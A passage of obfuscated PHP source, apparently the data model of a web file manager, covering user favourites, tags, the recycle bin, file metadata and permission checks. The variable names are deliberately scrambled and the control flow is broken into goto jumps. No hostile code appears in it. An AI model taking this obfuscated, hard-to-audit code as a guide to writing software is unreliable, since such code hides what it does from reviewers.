F˜ÀŠ¶¾: $f¹ ĞºÈŸ = $Bèâ¯ÄÖ[403]; $B±§ã¨¸Ì = explode($Bèâ¯ÄÖ[57], $f¹ ĞºÈŸ); $dµ¤ÈˆÁ‹Š = explode($Bèâ¯ÄÖ[57], $A«Ê¾ƒĞ¯™); goto D°º´¤Ğ¸Ê; d‘ãÒ°¯ï: } $d´åÃ×ê®¾[$Bèâ¯ÄÖ[85]] = $Bèâ¯ÄÖ[404] . $d´åÃ×ê®¾[$Bèâ¯ÄÖ[399]] . $Bèâ¯ÄÖ[405]; $d´åÃ×ê®¾[$Bèâ¯ÄÖ[39]] = $d´åÃ×ê®¾[$Bèâ¯ÄÖ[406]] == 1 ? $Bèâ¯ÄÖ[86] : $Bèâ¯ÄÖ[201]; goto cê¦•å¦²; EË‘§™ÚÍˆ: if (isset($d´åÃ×ê®¾[$Bèâ¯ÄÖ[409]]) && $d´åÃ×ê®¾[$Bèâ¯ÄÖ[409]][$Bèâ¯ÄÖ[410]] == -1) { $eÓ«ˆ—²¿• = $Eì‘Õå‡”‹; } $d´åÃ×ê®¾ = array_field_key($d´åÃ×ê®¾, $eÓ«ˆ—²¿•); return $d´åÃ×ê®¾; goto a­Àö­Ô‡õ; a­Àö­Ô‡õ: } public function listUserFav() { goto D¿ˆè™Äó; bÅ¬ãˆñä: foreach ($dğôÄˆõòª as &$cÌŠíÌİ‡¼) { $cÌŠíÌİ‡¼ = array($CÅÆ„–³¿Ò[415] => $cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[397]], $CÅÆ„–³¿Ò[416] => $cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[38]], $CÅÆ„–³¿Ò[417] => $cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[85]], $CÅÆ„–³¿Ò[418] => $cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[39]], $CÅÆ„–³¿Ò[419] => $cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[202]], $CÅÆ„–³¿Ò[420] => $cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[93]]); if ($cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[39]] == $CÅÆ„–³¿Ò[412] && $CºÚß‰ÁÃ[$cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[85]]]) { $cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[94]] = $CºÚß‰ÁÃ[$cÌŠíÌİ‡¼[$CÅÆ„–³¿Ò[85]]]; } } unset($cÌŠíÌİ‡¼); return $dğôÄˆõòª; goto BõŒ‰Ï²Ş; c©‰ÍÁø‡¦: $F´ŞÄôÒÈÅ = array_to_keyvalue($F´ŞÄôÒÈÅ, $CÅÆ„–³¿Ò[43], $CÅÆ„–³¿Ò[85]); if ($F´ŞÄôÒÈÅ) { $CºÚß‰ÁÃ = $this->listSource(array($CÅÆ„–³¿Ò[413] => array($CÅÆ„–³¿Ò[414], $F´ŞÄôÒÈÅ))); } $CºÚß‰ÁÃ = array_to_keyvalue($CºÚß‰ÁÃ[$CÅÆ„–³¿Ò[374]], $CÅÆ„–³¿Ò[399]); goto bÅ¬ãˆñä; D¿ˆè™Äó: $CÅÆ„–³¿Ò =& $_SERVER[¾÷]; $dğôÄˆõòª = Model($CÅÆ„–³¿Ò[411])->listData(); $F´ŞÄôÒÈÅ = array_filter_by_field($dğôÄˆõòª, $CÅÆ„–³¿Ò[39], $CÅÆ„–³¿Ò[412]); goto c©‰ÍÁø‡¦; BõŒ‰Ï²Ş: } public function listUserTag($aÎÙ¨ù‰») { goto eÕ„§àŸ¡š; eÕ„§àŸ¡š: $Añö®õí‰æ =& $_SERVER[¾÷]; if ($aÎÙ¨ù‰» && !is_array($aÎÙ¨ù‰»)) { $aÎÙ¨ù‰» = array($aÎÙ¨ù‰»); } $B›–›ã¶À† = Model($Añö®õí‰æ[421])->listData(); goto dòõØé¶¥š; bÇ¦ø¡Şæ×: if (!$DÄ¾„Ø³Œª || count($aË·æÌÄ‡Õ) == $DÄ¾„Ø³Œª[$Añö®õí‰æ[371]][$Añö®õí‰æ[372]]) { return $DÄ¾„Ø³Œª; } $e©ÁÌåÓŸ = array(); $f¶Çå»‚ = array_to_keyvalue($DÄ¾„Ø³Œª[$Añö®õí‰æ[84]], $Añö®õí‰æ[43], $Añö®õí‰æ[399]); goto a„¢Õò®è; dòõØé¶¥š: $B–ÙÈ¸ø— = array(); foreach ($B›–›ã¶À† as $aÏÍÇ²“Ã‘) { $a¤°ÙÚ‡’á = $aÏÍÇ²“Ã‘[$Añö®õí‰æ[85]]; if (!$a¤°ÙÚ‡’á) { continue; } if (!isset($B–ÙÈ¸ø—[$a¤°ÙÚ‡’á])) { $B–ÙÈ¸ø—[$a¤°ÙÚ‡’á] = array(); } $B–ÙÈ¸ø—[$a¤°ÙÚ‡’á][] = $aÏÍÇ²“Ã‘[$Añö®õí‰æ[422]]; } $aË·æÌÄ‡Õ = array(); goto FãÈ¦áÓõ´; aÙ¼óÎ¢Õ: if ($e©ÁÌåÓŸ) { Model($Añö®õí‰æ[423])->removeBySource($e©ÁÌåÓŸ); } return $DÄ¾„Ø³Œª; goto cßİÛ‹ËĞ; FãÈ¦áÓõ´: foreach ($B–ÙÈ¸ø— as $E¯àŒ¯œ• => $Aéâ¡‘ˆ) { $e’³†•©ñ = !0; if (!$aÎÙ¨ù‰») { $aË·æÌÄ‡Õ[] = $E¯àŒ¯œ•; continue; } foreach ($aÎÙ¨ù‰» as $C½ÈÁ¡ëÖƒ) { if (!in_array($C½ÈÁ¡ëÖƒ, $Aéâ¡‘ˆ)) { $e’³†•©ñ = !1; break; } } if ($e’³†•©ñ) { $aË·æÌÄ‡Õ[] = $E¯àŒ¯œ•; } } if (!$aË·æÌÄ‡Õ) { return array(); } $DÄ¾„Ø³Œª = $this->listSource(array($Añö®õí‰æ[413] => array($Añö®õí‰æ[414], $aË·æÌÄ‡Õ))); goto bÇ¦ø¡Şæ×; a„¢Õò®è: $CãŞ’»Ô·  = array_to_keyvalue($DÄ¾„Ø³Œª[$Añö®õí‰æ[83]], $Añö®õí‰æ[43], $Añö®õí‰æ[399]); $DÌÀÛìù¸« = array_merge($CãŞ’»Ô· , $f¶Çå»‚); foreach ($aË·æÌÄ‡Õ as $a¤°ÙÚ‡’á) { if (!in_array($a¤°ÙÚ‡’á, $DÌÀÛìù¸«)) { $e©ÁÌåÓŸ[] = $a¤°ÙÚ‡’á; } } goto aÙ¼óÎ¢Õ; cßİÛ‹ËĞ: } public function listUserRecycle() { $bš©¾È¿æç =& $_SERVER[¾÷]; $fò¨ˆåŒàù = Model($bš©¾È¿æç[424])->listData(); if (!$fò¨ˆåŒàù) { return array(); } $eÜô‰ÙËÅ· = array($bš©¾È¿æç[413] => array($bš©¾È¿æç[414], $fò¨ˆåŒàù), $bš©¾È¿æç[425] => 1); return $this->listSource($eÜô‰ÙËÅ·); } public function listSource($bÎ©‹†Ñ÷, $cÅÚ¯ğÒÇ™ = 3000) { goto e–›¯Ú¿Ÿ; e¦Ø¸ô: return $AÃ²Œ•©ó; goto E¸ÊÊæ»ïİ; e–›¯Ú¿Ÿ: $CŞî±ãŸ¶ =& $_SERVER[¾÷]; if (!isset($bÎ©‹†Ñ÷[$CŞî±ãŸ¶[426]])) { $bÎ©‹†Ñ÷[$CŞî±ãŸ¶[426]] = 0; } $c®Ôƒ‚ğˆä = $CŞî±ãŸ¶[427]; goto cÁ©ñƒèĞ; cÁ©ñƒèĞ: $AÃ²Œ•©ó = $this->field($c®Ôƒ‚ğˆä)->_makeOrder()->where($bÎ©‹†Ñ÷)->selectPage($cÅÚ¯ğÒÇ™); $this->_listDataApply($AÃ²Œ•©ó[$CŞî±ãŸ¶[374]]); $this->_listMake($AÃ²Œ•©ó); goto e¦Ø¸ô; E¸ÊÊæ»ïİ: } protected function _makeOrder() { goto F¾¾öèğÜ†; aËï“È¥Õ: $bŸŠ…‡¬œ = array($b´×ƒ‹–ÉÒ[431] => $b´×ƒ‹–ÉÒ[432], $b´×ƒ‹–ÉÒ[433] => $b´×ƒ‹–ÉÒ[434]); $c‹çî–ïÂ° = array($b´×ƒ‹–ÉÒ[38] => $b´×ƒ‹–ÉÒ[38], $b´×ƒ‹–ÉÒ[87] => $b´×ƒ‹–ÉÒ[87], $b´×ƒ‹–ÉÒ[177] => $b´×ƒ‹–ÉÒ[408], $b´×ƒ‹–ÉÒ[435] => $b´×ƒ‹–ÉÒ[435], $b´×ƒ‹–ÉÒ[436] => $b´×ƒ‹–ÉÒ[437], $b´×ƒ‹–ÉÒ[202] => $b´×ƒ‹–ÉÒ[202], $b´×ƒ‹–ÉÒ[93] => $b´×ƒ‹–ÉÒ[93]); $AòËÈ±Ï = Input::get($b´×ƒ‹–ÉÒ[438], $b´×ƒ‹–ÉÒ[17], $d‘ µ, array_keys($c‹çî–ïÂ°)); goto fİÈ¤Å•Ğ; fİÈ¤Å•Ğ: $CÙ•–¶•Æ = Input::get($b´×ƒ‹–ÉÒ[439], $b´×ƒ‹–ÉÒ[17], $dËª†Á©Œ, array_keys($bŸŠ…‡¬œ)); if (!in_array($AòËÈ±Ï, array_keys($c‹çî–ïÂ°))) { $AòËÈ±Ï = $b´×ƒ‹–ÉÒ[38]; } if (!in_array($CÙ•–¶•Æ, array_keys($bŸŠ…‡¬œ))) { $AòËÈ±Ï = $b´×ƒ‹–ÉÒ[431]; } goto dòæ‰ßÅë; F¾¾öèğÜ†: $b´×ƒ‹–ÉÒ =& $_SERVER[¾÷]; $d‘ µ = Model($b´×ƒ‹–ÉÒ[428])->get($b´×ƒ‹–ÉÒ[429]); $dËª†Á©Œ = Model($b´×ƒ‹–ÉÒ[428])->get($b´×ƒ‹–ÉÒ[430]); goto aËï“È¥Õ; dòæ‰ßÅë: if ($AòËÈ±Ï == $b´×ƒ‹–ÉÒ[38]) { } $e˜‘åà¢ßš = $b´×ƒ‹–ÉÒ[440] . $c‹çî–ïÂ°[$AòËÈ±Ï] . $b´×ƒ‹–ÉÒ[60] . $bŸŠ…‡¬œ[$CÙ•–¶•Æ]; return $this->order(rtrim(trim($e˜‘åà¢ßš), $b´×ƒ‹–ÉÒ[57])); goto F½óğ¿Éë²; F½óğ¿Éë²: } protected function _listDataApplyItem($d˜ƒ”È‰³¾, $AØˆÉÕ©Ÿ = false) { $b÷¤ÎŠî£™ = array($d˜ƒ”È‰³¾); $this->_listDataApply($b÷¤ÎŠî£™, $AØˆÉÕ©Ÿ); return $b÷¤ÎŠî£™[0]; } protected function _listDataApply(&$dÖ»İ°ä·ô, $C»·¾ºöªœ = false) { goto Fœ…ˆ®é›; Fœ…ˆ®é›: $dÎÊ»Ğ¹ãç =& $_SERVER[¾÷]; if (!$dÖ»İ°ä·ô) { $dÖ»İ°ä·ô = array(); return; } $f†à¿ï¡à = array_to_keyvalue($dÖ»İ°ä·ô, $dÎÊ»Ğ¹ãç[43], $dÎÊ»Ğ¹ãç[399]); goto eÑŒ—²Ú ¬; A§Ä¦¯–à: $this->_listAppendUser($dÖ»İ°ä·ô); $this->_listFilterInfo($dÖ»İ°ä·ô, $C»·¾ºöªœ); goto d¸½µœ¦ì; càËˆØÂ–ï: $this->_listAppendPath($dÖ»İ°ä·ô); $this->_listAppendAuth($dÖ»İ°ä·ô); $this->_listAppendSourceInfo($dÖ»İ°ä·ô, $f†à¿ï¡à); goto A§Ä¦¯–à; eÑŒ—²Ú ¬: $f†à¿ï¡à = array_unique($f†à¿ï¡à); $this->_listSourceCache($dÖ»İ°ä·ô); if (!$C»·¾ºöªœ) { $this->_listAppendMeta($dÖ»İ°ä·ô, $f†à¿ï¡à); $this->_listAppendFileMeta($dÖ»İ°ä·ô, $f†à¿ï¡à); $this->_listAppendChildren($dÖ»İ°ä·ô, $f†à¿ï¡à); } goto càËˆØÂ–ï; d¸½µœ¦ì: } protected function _listSourceCache($fÕ¾è¦Áœ‰) { $cóĞÜ°¿ù =& $_SERVER[¾÷]; foreach ($fÕ¾è¦Áœ‰ as $fõòäöœ¯Š) { self::$cacheSourceInfo[$cóĞÜ°¿ù[441] . $fõòäöœ¯Š[$cóĞÜ°¿ù[399]]] = $fõòäöœ¯Š; } } protected function _listFilterInfo(&$DÂ¨¬ìóİÛ, $D²¾ôô›¤‡ = false) { $c·¡¢”ŒöÍ =& $_SERVER[¾÷]; foreach ($DÂ¨¬ìóİÛ as &$AÆ—øò÷ƒ½) { $AÆ—øò÷ƒ½ = $this->pathInfoFilter($AÆ—øò÷ƒ½); self::$cachePathInfo[$c·¡¢”ŒöÍ[442] . intval($D²¾ôô›¤‡) . $c·¡¢”ŒöÍ[443] . $AÆ—øò÷ƒ½[$c·¡¢”ŒöÍ[399]]] = $AÆ—øò÷ƒ½; } unset($AÆ—øò÷ƒ½); } protected function _listMake(&$fï‘°ÄÑÌ) { $dÏ¦—‚‰ƒ¶ =& $_SERVER[¾÷]; $fï‘°ÄÑÌ[$dÏ¦—‚‰ƒ¶[84]] = array(); $fï‘°ÄÑÌ[$dÏ¦—‚‰ƒ¶[83]] = array(); foreach ($fï‘°ÄÑÌ[$dÏ¦—‚‰ƒ¶[374]] as $cìÎš†î£) { $E÷åÉÖïô‹ = $cìÎš†î£[$dÏ¦—‚‰ƒ¶[406]] == 1 ? $dÏ¦—‚‰ƒ¶[84] : $dÏ¦—‚‰ƒ¶[83]; $fï‘°ÄÑÌ[$E÷åÉÖïô‹][] = $cìÎš†î£; } unset($fï‘°ÄÑÌ[$dÏ¦—‚‰ƒ¶[374]]); } protected function _listAppendMeta(&$aÖˆÒ¥ˆÅ©, $eÔ§ëÅ£ßã) { goto e·¡Š°Á¬ï; aŸĞ™¬êßó: foreach ($eÈãÔº“çœ as $EñÁ•Ï—ª) { if (!isset($c„É¸”é‚î[$EñÁ•Ï—ª[$f‘Î‰ÒœËÔ[399]]])) { $c„É¸”é‚î[$EñÁ•Ï—ª[$f‘Î‰ÒœËÔ[399]]] = array(); } if (in_array($EñÁ•Ï—ª[$f‘Î‰ÒœËÔ[102]], $bÙë½ªĞ¡ï)) { continue; } $c„É¸”é‚î[$EñÁ•Ï—ª[$f‘Î‰ÒœËÔ[399]]][$EñÁ•Ï—ª[$f‘Î‰ÒœËÔ[102]]] = $EñÁ•Ï—ª[$f‘Î‰ÒœËÔ[379]]; } foreach ($aÖˆÒ¥ˆÅ© as &$FÕŒ¸¹³æ) { $FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[448]] = !1; if (isset($c„É¸”é‚î[$FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[399]]])) { $FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[448]] = $c„É¸”é‚î[$FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[399]]]; } if ($this->fileIsLock($FÕŒ¸¹³æ) && $FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[409]]) { $F¸Ï¼ˆÏÜÊ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[409]][$f‘Î‰ÒœËÔ[410]] = AuthModel::authDisable($FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[409]][$f‘Î‰ÒœËÔ[410]], $F¸Ï¼ˆÏÜÊ); $FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[409]][$f‘Î‰ÒœËÔ[449]][$f‘Î‰ÒœËÔ[409]] = $FÕŒ¸¹³æ[$f‘Î‰ÒœËÔ[409]][$f‘Î‰ÒœËÔ[410]]; } } unset($FÕŒ¸¹³æ); goto D”Š³íºõŒ; b„Ëêãíñ: if (!$eÈãÔº“çœ) { return; } $bÙë½ªĞ¡ï = array($f‘Î‰ÒœËÔ[446], $f‘Î‰ÒœËÔ[447]); $c„É¸”é‚î = array(); goto aŸĞ™¬êßó; e·¡Š°Á¬ï: $f‘Î‰ÒœËÔ =& $_SERVER[¾÷]; $DÅŸØïÎâ = array($f‘Î‰ÒœËÔ[413] => array($f‘Î‰ÒœËÔ[414], $eÔ§ëÅ£ßã)); $eÈãÔº“çœ = Model($f‘Î‰ÒœËÔ[444])->field($f‘Î‰ÒœËÔ[445])->where($DÅŸØïÎâ)->select(); goto b„Ëêãíñ; D”Š³íºõŒ: } protected function _listAppendFileMeta(&$cÔÃšÎ“œŠ, $B±¢Î¹Äé) { goto D„»ŒÊ’×Ç; BæáÚ¢ğó: $AÇÂÛ¼÷ = $AÇÂÛ¼÷ ? $AÇÂÛ¼÷ : array(); $F®Şè’ñ‚Û = array(); foreach ($AÇÂÛ¼÷ as $F‘È•Ÿö‚) { if (!isset($F®Şè’ñ‚Û[$F‘È•Ÿö‚[$B¥‡ãÌ’[450]]])) { $F®Şè’ñ‚Û[$F‘È•Ÿö‚[$B¥‡ãÌ’[450]]] = array(); } $F®Şè’ñ‚Û[$F‘È•Ÿö‚[$B¥‡ãÌ’[450]]][$F‘È•Ÿö‚[$B¥‡ãÌ’[102]]] = $F‘È•Ÿö‚[$B¥‡ãÌ’[379]]; } goto e¥è›óÉãñ; e¥è›óÉãñ: foreach ($cÔÃšÎ“œŠ as &$dÕÛ˜Œó) { goto A³ƒ¤ù¢‘÷; eĞõ÷ÏÁ˜”: if (isset($dÕÛ˜Œó[$B¥‡ãÌ’[173]][$B¥‡ãÌ’[172]])) { $dÕÛ˜Œó[$B¥‡ãÌ’[172]] = json_decode($dÕÛ˜Œó[$B¥‡ãÌ’[173]][$B¥‡ãÌ’[172]], !0); unset($dÕÛ˜Œó[$B¥‡ãÌ’[173]][$B¥‡ãÌ’[172]]); } goto CØö´÷’¬Ü; eÕŠó×Œ÷: unset($eæ æÙœÎ[$CˆØÄóå©][$B¥‡ãÌ’[85]]); $CÍ¨ğ™Û… = is_array($F®Şè’ñ‚Û[$CˆØÄóå©]) ? $F®Şè’ñ‚Û[$CˆØÄóå©] : array(); $dÕÛ˜Œó[$B¥‡ãÌ’[173]] = array_merge($CÍ¨ğ™Û…, $eæ æÙœÎ[$CˆØÄóå©]); goto eĞõ÷ÏÁ˜”; eÓªÊîå›: $bï¦Ñ¹“Š–[$B¥‡ãÌ’[87]] = $dÕÛ˜Œó[$B¥‡ãÌ’[87]]; $bï¦Ñ¹“Š–[$B¥‡ãÌ’[38]] = $dÕÛ˜Œó[$B¥‡ãÌ’[38]]; if (!isset(self::$cacheFileInfo[$B¥‡ãÌ’[456] . $CˆØÄóå©])) { self::$cacheFileInfo[$B¥‡ãÌ’[456] . $CˆØÄóå©] = array_merge(array(), $bï¦Ñ¹“Š–); } goto eÕŠó×Œ÷; A³ƒ¤ù¢‘÷: $CˆØÄóå© = $dÕÛ˜Œó[$B¥‡ãÌ’[450]]; if (!$CˆØÄóå© || !isset($eæ æÙœÎ[$CˆØÄóå©])) { continue; } $bï¦Ñ¹“Š– = $eæ æÙœÎ[$CˆØÄóå©]; goto eÓªÊîå›; CØö´÷’¬Ü: } unset($dÕÛ˜Œó); goto c™âÁÉ…óµ; dóìÒñöÎ®: $eæ æÙœÎ = Model($B¥‡ãÌ’[453])->field($féÊÆÂõÚÍ)->where($aƒèï¾·ñŸ)->select(); $eæ æÙœÎ = array_to_keyvalue($eæ æÙœÎ, $B¥‡ãÌ’[450]); $AÇÂÛ¼÷ = Model($B¥‡ãÌ’[454])->field($B¥‡ãÌ’[455])->where($aƒèï¾·ñŸ)->select(); goto BæáÚ¢ğó; A¢‘æ½œß¸: if (!$dë×‰„ùÜ¼) { return; } $aƒèï¾·ñŸ = array($B¥‡ãÌ’[451] => array($B¥‡ãÌ’[414], $dë×‰„ùÜ¼)); $féÊÆÂõÚÍ = $B¥‡ãÌ’[452]; goto dóìÒñöÎ®; D„»ŒÊ’×Ç: $B¥‡ãÌ’ =& $_SERVER[¾÷]; $dë×‰„ùÜ¼ = array_to_keyvalue($cÔÃšÎ“œŠ, $B¥‡ãÌ’[43], $B¥‡ãÌ’[450]); $dë×‰„ùÜ¼ = array_filter(array_unique($dë×‰„ùÜ¼)); goto A¢‘æ½œß¸; c™âÁÉ…óµ: } protected function _listAppendSourceInfo(&$FõŠàŞŒÊ, $F„™º«ğÈò) { goto b™Óğî¦òÅ; FÙ©¾õˆ“Ã: return $FõŠàŞŒÊ; goto f¤ƒğ³Ÿ; f·İºÀãºÕ: $dÍŒ¸õªù = array_to_keyvalue($AÛòÏ¡•÷ˆ, $fÙŞ©ÉÏ¿[397]); $cìàóåã†× = array_to_keyvalue_group($B‚èâŞ“, $fÙŞ©ÉÏ¿[85], $fÙŞ©ÉÏ¿[422]); $DÅÆ¼Ü‹İ = array_to_keyvalue($a…£šó”Æ, $fÙŞ©ÉÏ¿[85]); goto DŸÂ’ùÀƒ; dÜß–ê²Àî: $B‚èâŞ“ = Model($fÙŞ©ÉÏ¿[421])->listData(); $a…£šó”Æ = Model($fÙŞ©ÉÏ¿[411])->listData(); $böƒŞ±Ÿ—‚ = Model($fÙŞ©ÉÏ¿[459])->listSimple(); goto f·İºÀãºÕ; b™Óğî¦òÅ: $fÙŞ©ÉÏ¿ =& $_SERVER[¾÷]; if (!defined($fÙŞ©ÉÏ¿[457])) { return; } $AÛòÏ¡•÷ˆ = Model($fÙŞ©ÉÏ¿[458])->listData(); goto dÜß–ê²Àî; DŸÂ’ùÀƒ: $c¥ÈâøèÛº = array_to_keyvalue_group($böƒŞ±Ÿ—‚, $fÙŞ©ÉÏ¿[399]); foreach ($FõŠàŞŒÊ as &$e™œšÒä–ª) { $e™œšÒä–ª[$fÙŞ©ÉÏ¿[94]] = array($fÙŞ©ÉÏ¿[460] => 0, $fÙŞ©ÉÏ¿[461] => 0, $fÙŞ©ÉÏ¿[462] => 0); if (isset($DÅÆ¼Ü‹İ[$e™œšÒä–ª[$fÙŞ©ÉÏ¿[399]]])) { $e™œšÒä–ª[$fÙŞ©ÉÏ¿[94]][$fÙŞ©ÉÏ¿[463]] = 1; $e™œšÒä–ª[$fÙŞ©ÉÏ¿[94]][$fÙŞ©ÉÏ¿[464]] = $DÅÆ¼Ü‹İ[$e™œšÒä–ª[$fÙŞ©ÉÏ¿[399]]][$fÙŞ©ÉÏ¿[38]]; } if (isset($cìàóåã†×[$e™œšÒä–ª[$fÙŞ©ÉÏ¿[399]]])) { $e™œšÒä–ª[$fÙŞ©ÉÏ¿[94]][$fÙŞ©ÉÏ¿[465]] = array(); foreach ($cìàóåã†×[$e™œšÒä–ª[$fÙŞ©ÉÏ¿[399]]] as $c¡ŠÆÜ‹Ø) { $CŒèó•îÂÍ = $dÍŒ¸õªù[$c¡ŠÆÜ‹Ø]; $e™œšÒä–ª[$fÙŞ©ÉÏ¿[94]][$fÙŞ©ÉÏ¿[465]][] = array($fÙŞ©ÉÏ¿[466] => $CŒèó•îÂÍ[$fÙŞ©ÉÏ¿[397]], $fÙŞ©ÉÏ¿[416] => $CŒèó•îÂÍ[$fÙŞ©ÉÏ¿[38]], $fÙŞ©ÉÏ¿[467] => $CŒèó•îÂÍ[$fÙŞ©ÉÏ¿[468]]); } } if (isset($c¥ÈâøèÛº[$e™œšÒä–ª[$fÙŞ©ÉÏ¿[399]]])) { $e™œšÒä–ª[$fÙŞ©ÉÏ¿[94]][$fÙŞ©ÉÏ¿[469]] = array(); foreach ($c¥ÈâøèÛº[$e™œšÒä–ª[$fÙŞ©ÉÏ¿[399]]] as $B»ÅïÚ‚Áé) { $e™œšÒä–ª[$fÙŞ©ÉÏ¿[94]][$fÙŞ©ÉÏ¿[469]] = array($fÙŞ©ÉÏ¿[470] => $B»ÅïÚ‚Áé[$fÙŞ©ÉÏ¿[471]], $fÙŞ©ÉÏ¿[472] => $B»ÅïÚ‚Áé[$fÙŞ©ÉÏ¿[473]], $fÙŞ©ÉÏ¿[474] => $B»ÅïÚ‚Áé[$fÙŞ©ÉÏ¿[399]], $fÙŞ©ÉÏ¿[475] => $B»ÅïÚ‚Áé[$fÙŞ©ÉÏ¿[476]], $fÙŞ©ÉÏ¿[477] => $B»ÅïÚ‚Áé[$fÙŞ©ÉÏ¿[478]], $fÙŞ©ÉÏ¿[479] => $B»ÅïÚ‚Áé[$fÙŞ©ÉÏ¿[479]], $fÙŞ©ÉÏ¿[480] => $B»ÅïÚ‚Áé[$fÙŞ©ÉÏ¿[480]]); } } } unset($e™œšÒä–ª); goto FÙ©¾õˆ“Ã; f¤ƒğ³Ÿ: } protected function _listAppendChildren(&$Eç²ÁğÓ·, $dÁò†ëé‚§) { goto AÄÒóÇ‹Å»; AÄÒóÇ‹Å»: $A‚ëØĞŸªº =& $_SERVER[¾÷]; $EÀŸ¾ÈÕ„ö = array(); $dŒ¥İ“¯Üä = array($A‚ëØĞŸªº[211] => 0, $A‚ëØĞŸªº[212] => 0); goto bÏ¡öÍ»µ‡; e¾‹Öç¦Á: $DÏÕ¶›¤ = array(); foreach ($EõŠ­‘É as $F¨Ñì«‹®‡) { $bÂ……âËñÙ = $F¨Ñì«‹®‡[$A‚ëØĞŸªº[481]]; $A×ËóÚ»îÓ = $F¨Ñì«‹®‡[$A‚ëØĞŸªº[406]] == $A‚ëØĞŸªº[96] ? $A‚ëØĞŸªº[212] : $A‚ëØĞŸªº[211]; if (!isset($DÏÕ¶›¤[$bÂ……âËñÙ])) { $DÏÕ¶›¤[$bÂ……âËñÙ] = array($A‚ëØĞŸªº[211] => 0, $A‚ëØĞŸªº[212] => 0); } $DÏÕ¶›¤[$bÂ……âËñÙ][$A×ËóÚ»îÓ] += $F¨Ñì«‹®‡[$A‚ëØĞŸªº[483]]; } foreach ($Eç²ÁğÓ· as &$C·ä˜™¼÷…) { if (!$C·ä˜™¼÷…[$A‚ëØĞŸªº[406]]) { continue; } $E¸µæÃåß¸ = is_array($DÏÕ¶›¤[$C·ä˜™¼÷…[$A‚ëØĞŸªº[399]]]) ? $DÏÕ¶›¤[$C·ä˜™¼÷…[$A‚ëØĞŸªº[399]]] : $dŒ¥İ“¯Üä; $C·ä˜™¼÷…[$A‚ëØĞŸªº[212]] = $E¸µæÃåß¸[$A‚ëØĞŸªº[212]]; $C·ä˜™¼÷…[$A‚ëØĞŸªº[211]] = $E¸µæÃåß¸[$A‚ëØĞŸªº[211]]; unset($C·ä˜™¼÷…[$A‚ëØĞŸªº[408]]); } goto EõííÈŞ÷å; EõííÈŞ÷å: unset($C·ä˜™¼÷…); goto BĞñÍ’¹À; bÏ¡öÍ»µ‡: foreach ($Eç²ÁğÓ· as &$C·ä˜™¼÷…) { if (!$C·ä˜™¼÷…[$A‚ëØĞŸªº[406]]) { continue; } $EÀŸ¾ÈÕ„ö[] = $C·ä˜™¼÷…[$A‚ëØĞŸªº[399]]; } unset($C·ä˜™¼÷…); if (!$EÀŸ¾ÈÕ„ö) { return; } goto C¤İÕöô¾²; C¤İÕöô¾²: $EËŒÆ”ùÓó = array($A‚ëØĞŸªº[481] => array($A‚ëØĞŸªº[17], $EÀŸ¾ÈÕ„ö)); $d¼Ø’ˆ … = array($A‚ëØĞŸªº[481], $A‚ëØĞŸªº[406], $A‚ëØĞŸªº[482] => $A‚ëØĞŸªº[483]); $EõŠ­‘É = $this->field($d¼Ø’ˆ …)->where($EËŒÆ”ùÓó)->group($A‚ëØĞŸªº[484])->select(); goto e¾‹Öç¦Á; BĞñÍ’¹À: } protected function _listAppendAuth(&$fÏÙæ–ÃÃç) { goto cî™£ÌÔÔ‘; dÙƒ™ˆÕ…‰: foreach ($fÏÙæ–ÃÃç as $BØ¸ÃÀÄá’) { if ($BØ¸ÃÀÄá’[$bì’È¤ÙÊ[407]] == self::TYPE_GROUP) { $aÉÃî…¢©Ä[] = $BØ¸ÃÀÄá’[$bì’È¤ÙÊ[399]]; } } if (!$aÉÃî…¢©Ä) { return; } $dÀåë¢â«Û = array_to_keyvalue($fÏÙæ–ÃÃç, $bì’È¤ÙÊ[399]); goto CÉÚÚ¨¬Ÿ; cî™£ÌÔÔ‘: $bì’È¤ÙÊ =& $_SERVER[¾÷]; if (!defined($bì’È¤ÙÊ[457])) { return; } $aÉÃî…¢©Ä = array(); goto dÙƒ™ˆÕ…‰; CÉÚÚ¨¬Ÿ: $C‹¯íå«‡¨ = Model($bì’È¤ÙÊ[485])->getSourceList($aÉÃî…¢©Ä, $dÀåë¢â«Û); foreach ($fÏÙæ–ÃÃç as $Fâ£ìÁÀ¤ğ => &$BØ¸ÃÀÄá’) { $BØ¸ÃÀÄá’[$bì’È¤ÙÊ[409]] = $C‹¯íå«‡¨[$BØ¸ÃÀÄá’[$bì’È¤ÙÊ[399]]]; if (!$BØ¸ÃÀÄá’[$bì’È¤ÙÊ[409]] && $BØ¸ÃÀÄá’[$bì’È¤ÙÊ[407]] == self::TYPE_GROUP) { $BØ¸ÃÀÄá’[$bì’È¤ÙÊ[409]] = Action($bì’È¤ÙÊ[486])->pathGroupAuthMake($BØ¸ÃÀÄá’[$bì’È¤ÙÊ[487]]); if (!$BØ¸ÃÀÄá’[$bì’È¤ÙÊ[409]] && !_get($GLOBALS, $bì’È¤ÙÊ[488])) { $BØ¸ÃÀÄá’[$bì’È¤ÙÊ[204]] = !1; $BØ¸ÃÀÄá’[$bì’È¤ÙÊ[203]] = !1; } } if ($BØ¸ÃÀÄá’[$bì’È¤ÙÊ[409]]) { $BØ¸ÃÀÄá’[$bì’È¤ÙÊ[204]] = AuthModel::authCheckEdit($BØ¸ÃÀÄá’[$bì’È¤ÙÊ[409]][$bì’È¤ÙÊ[410]]); $BØ¸ÃÀÄá’[$bì’È¤ÙÊ[203]] = AuthModel::authCheckView($BØ¸ÃÀÄá’[$bì’È¤ÙÊ[409]][$bì’È¤ÙÊ[410]]); } $this->groupPathDisplay($BØ¸ÃÀÄá’); } unset($BØ¸ÃÀÄá’); goto d×µÒ‚µ¿; d×µÒ‚µ¿: } public function 